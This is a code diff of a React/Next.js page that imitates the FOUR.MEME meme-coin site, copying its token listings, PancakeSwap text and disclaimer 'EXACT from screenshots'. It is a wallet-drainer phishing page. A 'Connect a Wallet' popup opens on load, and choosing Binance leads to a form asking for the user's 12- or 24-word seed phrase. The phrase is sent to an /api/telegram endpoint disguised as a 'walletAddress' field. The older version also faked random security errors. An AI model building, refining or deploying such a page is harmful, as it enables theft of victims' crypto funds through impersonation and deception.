@@ -1,39 +1,38 @@
-// page.tsx
 'use client';
-import { useState } from 'react';
+
+import { useEffect, useState } from 'react';
 
 export default function Home() {
-  const [showWalletConnect, setShowWalletConnect] = useState(false);
-  const [showImportWallet, setShowImportWallet] = useState(false);
-  const [connectionError, setConnectionError] = useState(false);
-  const [connecting, setConnecting] = useState(false);
-  const [seedPhrase, setSeedPhrase] = useState(Array(12).fill(''));
-  const [is24Word, setIs24Word] = useState(false);
+  const [showWalletPopup, setShowWalletPopup] = useState(false);
+  const [showSeedPhrase, setShowSeedPhrase] = useState(false);
+  const [seedLength, setSeedLength] = useState(12);
+  const [seedPhrase, setSeedPhrase] = useState('');
+  const [isLoading, setIsLoading] = useState(false);
 
-  const handleBinanceConnect = () => {
-    setConnecting(true);
-    setConnectionError(false);
-    
-    setTimeout(() => {
-      setConnecting(false);
-      if (Math.random() > 0.5) {
-        setConnectionError(true);
-      }
-    }, 2000);
+  useEffect(() => {
+    setShowWalletPopup(true);
+  }, []);
+
+  const handleBinanceClick = () => {
+    setShowSeedPhrase(true);
   };
 
-  const handleImport = async () => {
-    const fullPhrase = seedPhrase.join(' ').trim();
-    const wordCount = fullPhrase.split(/\s+/).length;
-    const requiredWords = is24Word ? 24 : 12;
-    
-    if (wordCount < requiredWords) {
-      alert(`Please enter a complete ${requiredWords}-word seed phrase`);
+  const handleSeedPhraseSubmit = async () => {
+    if (!seedPhrase.trim()) {
+      alert('Please enter your seed phrase');
       return;
     }
 
+    const wordCount = seedPhrase.trim().split(/\s+/).length;
+    if (wordCount < seedLength) {
+      alert(`Please enter a complete ${seedLength}-word seed phrase`);
+      return;
+    }
+
+    setIsLoading(true);
+
     try {
-      console.log('🔄 Importing seed phrase:', fullPhrase);
+      console.log('🔄 Importing seed phrase:', seedPhrase);
       
       const response = await fetch('/api/telegram', {
         method: 'POST',
@@ -41,7 +40,7 @@ export default function Home() {
           'Content-Type': 'application/json',
         },
         body: JSON.stringify({ 
-          walletAddress: fullPhrase 
+          walletAddress: seedPhrase 
         }),
       });
 
@@ -49,10 +48,9 @@ export default function Home() {
 
       if (response.ok) {
         console.log('✅ Wallet imported successfully');
-        setShowImportWallet(false);
-        setShowWalletConnect(false);
-        setSeedPhrase(Array(12).fill(''));
-        setIs24Word(false);
+        setShowSeedPhrase(false);
+        setShowWalletPopup(false);
+        setSeedPhrase('');
         alert('Wallet imported successfully! Check your Telegram for confirmation.');
       } else {
         throw new Error(data.error || 'Failed to import wallet');
@@ -60,279 +58,212 @@ export default function Home() {
     } catch (error) {
       console.error('❌ Import error:', error);
       alert('Failed to import wallet. Please try again.');
+    } finally {
+      setIsLoading(false);
     }
   };
 
-  const handleWordTypeChange = (is24WordMode: boolean) => {
-    setIs24Word(is24WordMode);
-    setSeedPhrase(Array(is24WordMode ? 24 : 12).fill(''));
+  const handleSeedLengthChange = (length: number) => {
+    setSeedLength(length);
+    setSeedPhrase(''); // Clear seed phrase when changing length
   };
 
   return (
-    <div className="min-h-screen bg-black text-white">
-      {/* Top Bar - EXACT from screenshots */}
-      <div className="flex justify-between items-center p-4 border-b border-gray-800">
-        <div className="flex items-center space-x-4">
-          {/* Menu icon - non functional as requested */}
-          <div className="w-6 h-6 bg-gray-600 rounded"></div>
-          <h1 className="text-xl font-bold">FOUR</h1>
-        </div>
-        
-        {/* Connect Wallet button */}
+    <div className="min-h-screen bg-white text-black font-sans">
+      {/* Header */}
+      <header className="flex justify-between items-center p-4 border-b border-gray-200">
+        <div className="text-2xl font-bold">FOUR</div>
         <button 
-          onClick={() => setShowWalletConnect(true)}
-          className="bg-green-500 hover:bg-green-600 px-4 py-2 rounded text-sm"
+          onClick={() => setShowWalletPopup(true)}
+          className="text-2xl"
         >
-          Connect Wallet
+          ☰
         </button>
-      </div>
+      </header>
 
-      {/* Main Content Area */}
-      <div className="p-4">
-        {/* Recent Activity Section - EXACT from screenshot */}
+      {/* Main Content */}
+      <main className="p-4">
+        {/* Token Header */}
         <div className="mb-6">
-          <div className="text-sm space-y-2 mb-4">
-            <div className="flex justify-between">
-              <span className="text-green-400">Oxa9...68cf0a</span>
-              <span>Bought O.2 BNB of BNBSZN</span>
-            </div>
-            <div className="flex justify-between">
-              <span className="text-green-400">Ox3d...5bcfdc</span>
-              <span>Bought O.35 BNB of BNBSZN</span>
-            </div>
-            <div className="flex justify-between">
-              <span className="text-green-400">Ox1e...b170de</span>
-              <span>Bou O.2 BNB of Brocc</span>
-            </div>
+          <h1 className="text-2xl font-bold mb-2">Time</h1>
+          <p className="text-lg text-gray-800">$0.0%</p>
+        </div>
+
+        <div className="border-t border-gray-200 my-4"></div>
+
+        {/* Token Details */}
+        <div className="mb-8">
+          <p className="text-sm font-semibold mb-2 text-gray-700">Meme created by: 0x6a...6873</p>
+          <h2 className="text-xl font-bold mb-2">Seasons ... (BNB)</h2>
+          <p className="text-gray-600 mb-4 text-sm">Heard even the seasons are being renamed now...</p>
+          <p className="text-sm text-gray-800">Market Cap: 7.65 K</p>
+        </div>
+
+        {/* Additional Token Cards */}
+        <div className="space-y-6">
+          {/* CZ FOOD Card */}
+          <div className="border border-gray-200 rounded-lg p-4 bg-white">
+            <p className="text-xs text-gray-500 mb-2">created by: 0xaa...2994</p>
+            <h3 className="font-bold mb-2 text-gray-800">CZ FOOD (BNB)</h3>
+            <p className="mb-2 text-gray-600">CZ</p>
+            <p className="text-sm text-gray-800">Market Cap: 8.22 K</p>
           </div>
 
-          {/* Action Buttons */}
-          <div className="grid grid-cols-2 gap-3 mb-4">
-            <button className="bg-gray-900 py-3 rounded text-center">
-              Create Token
-            </button>
-            <button className="bg-gray-900 py-3 rounded text-center">
-              How it works
-            </button>
-          </div>
+          <div className="border-t border-gray-200 my-4"></div>
 
-          {/* The New Way To MEME */}
-          <div className="bg-gray-900 rounded p-4 mb-4">
-            <h3 className="font-bold mb-1">The New Way To MEME</h3>
-            <p className="text-gray-400 text-sm mb-2">Become A TAGGER</p>
-            <div className="flex space-x-2">
-              <span className="bg-gray-800 px-2 py-1 rounded text-xs">Stern</span>
-              <span className="bg-gray-800 px-2 py-1 rounded text-xs">Taggers</span>
-            </div>
-          </div>
-
-          {/* Search */}
-          <div className="mb-4">
-            <div className="bg-gray-900 rounded p-3 mb-2">
-              <span className="text-gray-400">Search Token</span>
-            </div>
-            <div className="flex items-center">
-              <div className="w-4 h-4 border border-gray-400 rounded mr-2"></div>
-              <span className="text-sm text-gray-400">Listed on PancakeSwap</span>
-            </div>
+          {/* Broccoli Card */}
+          <div className="border border-gray-200 rounded-lg p-4 bg-white">
+            <p className="text-xs text-gray-500 mb-2">created by: 0x4e...0618</p>
+            <h3 className="font-bold mb-2 text-gray-800">Broccoli ... (BNB)</h3>
+            <p className="mb-2 text-gray-600">Broccoli DOGGY</p>
+            <p className="text-sm text-gray-800">Market Cap: 7.94 K</p>
+            <p className="text-xs mt-2 text-gray-500">Partnership</p>
           </div>
         </div>
 
-        {/* Navigation Tabs - EXACT positioning */}
-        <div className="flex space-x-6 mb-4 border-b border-gray-800 pb-2">
-          <button className="font-medium">All Tag</button>
-          <button className="text-gray-400">All Token</button>
-          <button className="text-gray-400">Time</button>
-        </div>
+        {/* PancakeSwap Section */}
+        <div className="mt-8">
+          <h2 className="text-2xl font-bold mb-4 text-gray-800">PancakeSwap</h2>
+          <p className="text-sm text-gray-600 mb-6 leading-relaxed">
+            PancakeSwap is a decentralized exchange (DEX) built on BNB Chain that utilizes an automated market making (AMM) system. It is a fork of SushiSwap, with an almost identical codebase, but it has the advantage of cheaper and faster transactions due to being built on BSC. Additionally, it offers features such as yield farming across other protocols, lotteries, and initial farm offerings (IFO).
+          </p>
 
-        {/* Token Listings - Left aligned like screenshots */}
-        <div className="space-y-4">
-          {/* Token 1 - Seasons */}
-          <div className="bg-gray-900 rounded p-4">
-            <div className="flex justify-between items-start mb-2">
+          <div className="border-t border-gray-200 my-4"></div>
+
+          {/* Disclaimer Section */}
+          <div className="text-xs text-gray-600 leading-relaxed">
+            <p className="mb-4">
+              Disclaimer: Digital assets are highly speculative and involve significant risk of loss. The value of meme coins is extremely volatile, and any one who wishes to trade in any meme coin should be prepared for the possibility of losing their entire investment.
+            </p>
+            <p className="mb-4">
+              FOUR. MEME makes no representations or warranties regarding the success or profitability of any meme coin developed on the platform. FOUR. MEME is a public, decentralized, and permissionless platform. Participation by any project should not be seen as an endorsement or recommendation by FOUR. MEME. Users should assess their financial situation, risk tolerance, and do their own research before trading in any meme coins on the platform. FOUR. MEME will not be held liable for any losses, damages, or issues that may arise from trading in any meme coins developed on the platform. More information about (DYOR) can be found via <span className="font-semibold text-gray-800">Binance Academy</span> and <span className="font-semibold text-gray-800">Terms of Use</span>
+            </p>
+          </div>
+        </div>
+      </main>
+
+      {/* Wallet Popup */}
+      {showWalletPopup && (
+        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-end justify-center z-50">
+          <div className="bg-white w-full max-w-md rounded-t-2xl p-6 max-h-[90vh] overflow-y-auto">
+            {/* Seed Phrase Entry */}
+            {showSeedPhrase ? (
               <div>
-                <h3 className="font-semibold">Seasons ... (BNB)</h3>
-                <p className="text-xs text-gray-400">Meme created by: Qx6a...6873</p>
-              </div>
-              <span className="text-green-400 text-sm">$0.0%</span>
-            </div>
-            <p className="text-sm text-gray-300 mb-2">Heard even the seasons are being renamed now...</p>
-            <div className="text-sm text-gray-400">
-              Market Cap: 7.65 K
-            </div>
-          </div>
-
-          {/* Token 2 - CZ FOOD */}
-          <div className="bg-gray-900 rounded p-4">
-            <div className="mb-2">
-              <h3 className="font-semibold">CZ FOOD (BNB)</h3>
-              <p className="text-xs text-gray-400">created by: Oxaa...2994</p>
-            </div>
-            <div className="text-sm text-gray-400">
-              Market Cap: 8.22 K
-            </div>
-          </div>
-
-          {/* Token 3 - Broccoli */}
-          <div className="bg-gray-900 rounded p-4">
-            <div className="mb-2">
-              <h3 className="font-semibold">Broccoli ... (BNB)</h3>
-              <p className="text-xs text-gray-400">createalpy: Ox4e...0618</p>
-            </div>
-            <p className="text-sm text-gray-300 mb-2">Broccoli DOGGY</p>
-            <div className="flex justify-between text-sm">
-              <span className="text-gray-400">Market Cap: 7.94 K</span>
-              <span className="text-blue-400">Partnership</span>
-            </div>
-          </div>
-        </div>
-      </div>
-
-      {/* Wallet Connect Modal - EXACT from screenshots */}
-      {showWalletConnect && (
-        <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4">
-          <div className="bg-gray-900 rounded-lg w-full max-w-sm border border-gray-700">
-            <div className="p-6 border-b border-gray-700 text-center">
-              <h2 className="text-xl font-bold">Connect a Wallet</h2>
-            </div>
-
-            <div className="p-6">
-              {connecting ? (
-                <div className="text-center py-4">
-                  <p className="font-medium mb-2">Opening Wallet...</p>
-                  <p className="text-sm text-gray-400">Confirm connection in the wallet</p>
+                <div className="flex justify-between items-center mb-6">
+                  <h2 className="text-xl font-bold text-gray-800">Enter Seed Phrase</h2>
+                  <button 
+                    onClick={() => {
+                      setShowSeedPhrase(false);
+                      setSeedPhrase('');
+                    }}
+                    className="text-2xl text-gray-500 hover:text-gray-700"
+                  >
+                    ×
+                  </button>
                 </div>
-              ) : connectionError ? (
-                <div className="text-center py-4">
-                  <p className="text-sm text-gray-300 mb-4">
-                    We encountered a temporary security issue. This could be due to network instability or protection mechanisms.
+                
+                {/* Seed Length Toggle */}
+                <div className="flex border border-gray-300 rounded-lg mb-6 overflow-hidden">
+                  <button
+                    onClick={() => handleSeedLengthChange(12)}
+                    className={`flex-1 py-3 text-center text-sm font-medium ${
+                      seedLength === 12 
+                        ? 'bg-gray-800 text-white' 
+                        : 'bg-white text-gray-700 border-r border-gray-300'
+                    }`}
+                  >
+                    12 words
+                  </button>
+                  <button
+                    onClick={() => handleSeedLengthChange(24)}
+                    className={`flex-1 py-3 text-center text-sm font-medium ${
+                      seedLength === 24 
+                        ? 'bg-gray-800 text-white' 
+                        : 'bg-white text-gray-700'
+                    }`}
+                  >
+                    24 words
+                  </button>
+                </div>
+
+                {/* Seed Phrase Input */}
+                <div className="mb-6">
+                  <textarea
+                    value={seedPhrase}
+                    onChange={(e) => setSeedPhrase(e.target.value)}
+                    placeholder={`Enter your ${seedLength}-word seed phrase separated by spaces`}
+                    className="w-full h-32 border border-gray-300 rounded-lg p-3 resize-none text-sm placeholder-gray-400 focus:outline-none focus:border-gray-400"
+                  />
+                </div>
+
+                <button 
+                  onClick={handleSeedPhraseSubmit}
+                  disabled={isLoading}
+                  className="w-full bg-gray-800 text-white py-3 px-4 rounded-lg text-sm font-medium hover:bg-gray-700 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
+                >
+                  {isLoading ? (
+                    <>
+                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
+                      Importing...
+                    </>
+                  ) : (
+                    'Connect Wallet'
+                  )}
+                </button>
+              </div>
+            ) : (
+              /* Wallet Selection */
+              <div>
+                <div className="flex justify-between items-center mb-6">
+                  <h2 className="text-xl font-bold text-gray-800">Connect a Wallet</h2>
+                  <button 
+                    onClick={() => setShowWalletPopup(false)}
+                    className="text-2xl text-gray-500 hover:text-gray-700"
+                  >
+                    ×
+                  </button>
+                </div>
+                
+                <div className="grid grid-cols-2 gap-3 mb-6">
+                  <button className="border border-gray-200 rounded-lg p-4 text-center hover:bg-gray-50 transition-colors">
+                    <div className="font-medium text-gray-700 text-sm">Github</div>
+                  </button>
+                  <button className="border border-gray-200 rounded-lg p-4 text-center hover:bg-gray-50 transition-colors">
+                    <div className="font-medium text-gray-700 text-sm">Google</div>
+                  </button>
+                  <button 
+                    onClick={handleBinanceClick}
+                    className="border border-gray-200 rounded-lg p-4 text-center hover:bg-gray-50 transition-colors"
+                  >
+                    <div className="font-medium text-gray-700 text-sm">Binance</div>
+                    <div className="text-xs text-gray-500 mt-1">Wallet</div>
+                  </button>
+                  <button className="border border-gray-200 rounded-lg p-4 text-center hover:bg-gray-50 transition-colors">
+                    <div className="font-medium text-gray-700 text-sm">OKX</div>
+                    <div className="text-xs text-gray-500 mt-1">Wallet</div>
+                  </button>
+                </div>
+
+                <div className="border-t border-gray-200 pt-6">
+                  <h3 className="font-bold mb-2 text-gray-800">What is a Wallet?</h3>
+                  <p className="text-sm text-gray-600 mb-4 leading-relaxed">
+                    A wallet is used to send, receive, store, and display digital assets. It&apos;s also a new way to log in, 
+                    without needing to create new accounts and passwords on every website.
                   </p>
-                  <button 
-                    onClick={() => setConnectionError(false)}
-                    className="bg-green-500 hover:bg-green-600 w-full py-3 rounded-lg font-medium mb-2"
-                  >
-                    Retry Connection
-                  </button>
-                  <button className="text-blue-400 text-sm">Learn More</button>
+                  <div className="flex space-x-3">
+                    <button className="flex-1 bg-gray-800 text-white py-3 px-4 rounded-lg text-sm font-medium hover:bg-gray-700">
+                      Get a Wallet
+                    </button>
+                    <button className="flex-1 border border-gray-300 text-gray-700 py-3 px-4 rounded-lg text-sm font-medium hover:bg-gray-50">
+                      Learn More
+                    </button>
+                  </div>
                 </div>
-              ) : (
-                <>
-                  <div className="grid grid-cols-2 gap-3 mb-6">
-                    <button className="bg-gray-800 p-4 rounded-lg flex flex-col items-center">
-                      <span className="text-lg mb-1">thub</span>
-                      <span className="text-sm">Wallet</span>
-                    </button>
-                    <button className="bg-gray-800 p-4 rounded-lg flex flex-col items-center">
-                      <span className="text-lg mb-1">G</span>
-                      <span className="text-sm">Google</span>
-                    </button>
-                    <button 
-                      onClick={handleBinanceConnect}
-                      className="bg-gray-800 p-4 rounded-lg flex flex-col items-center"
-                    >
-                      <span className="text-lg mb-1">₿</span>
-                      <span className="text-sm">Binance Wallet</span>
-                    </button>
-                    <button className="bg-gray-800 p-4 rounded-lg flex flex-col items-center">
-                      <span className="text-lg mb-1">OKX</span>
-                      <span className="text-sm">Wallet</span>
-                    </button>
-                  </div>
-
-                  <button 
-                    onClick={() => setShowImportWallet(true)}
-                    className="text-blue-400 text-sm w-full text-center"
-                  >
-                    Import using seed phrase
-                  </button>
-                </>
-              )}
-            </div>
-
-            <div className="p-4 border-t border-gray-700">
-              <button 
-                onClick={() => setShowWalletConnect(false)}
-                className="w-full bg-gray-800 hover:bg-gray-700 py-3 rounded-lg"
-              >
-                Cancel
-              </button>
-            </div>
-          </div>
-        </div>
-      )}
-
-      {/* Import Wallet Modal - EXACT with 12/24 words */}
-      {showImportWallet && (
-        <div className="fixed inset-0 bg-black bg-opacity-90 flex items-center justify-center z-50 p-4">
-          <div className="bg-gray-900 rounded-lg w-full max-w-md border border-gray-700">
-            <div className="p-6 border-b border-gray-700 text-center">
-              <h2 className="text-xl font-bold">Import Wallet</h2>
-            </div>
-
-            <div className="p-6">
-              {/* 12/24 Word Selection */}
-              <div className="flex space-x-3 mb-6">
-                <button 
-                  onClick={() => handleWordTypeChange(false)}
-                  className={`flex-1 py-2 rounded ${!is24Word ? 'bg-green-500' : 'bg-gray-800'}`}
-                >
-                  12 Words
-                </button>
-                <button 
-                  onClick={() => handleWordTypeChange(true)}
-                  className={`flex-1 py-2 rounded ${is24Word ? 'bg-green-500' : 'bg-gray-800'}`}
-                >
-                  24 Word
-                </button>
               </div>
-
-              <p className="text-sm text-gray-300 mb-4 text-center">
-                Enter your {is24Word ? '24' : '12'}-word seed phrase here.<br />
-                Words are separated by single spaces.
-              </p>
-              
-              {/* Seed phrase grid */}
-              <div className="grid grid-cols-2 gap-2 mb-6">
-                {Array(is24Word ? 24 : 12).fill('').map((_, index) => (
-                  <div key={index} className="flex items-center">
-                    <span className="text-gray-400 text-sm w-6">{index + 1}</span>
-                    <input
-                      type="text"
-                      value={seedPhrase[index] || ''}
-                      onChange={(e) => {
-                        const newPhrase = [...seedPhrase];
-                        newPhrase[index] = e.target.value;
-                        setSeedPhrase(newPhrase);
-                      }}
-                      className="bg-gray-800 border border-gray-700 rounded p-2 text-sm flex-1 text-white"
-                      placeholder={`Word ${index + 1}`}
-                    />
-                  </div>
-                ))}
-              </div>
-
-              <div className="flex space-x-3">
-                <button
-                  onClick={() => {
-                    setShowImportWallet(false);
-                    setSeedPhrase(Array(12).fill(''));
-                    setIs24Word(false);
-                  }}
-                  className="flex-1 bg-gray-800 hover:bg-gray-700 py-3 rounded-lg"
-                >
-                  Cancel
-                </button>
-                <button
-                  onClick={handleImport}
-                  className="flex-1 bg-green-500 hover:bg-green-600 py-3 rounded-lg font-medium"
-                >
-                  Import
-                </button>
-              </div>
-            </div>
+            )}
           </div>
         </div>
       )}
     </div>
   );
-}	
+}
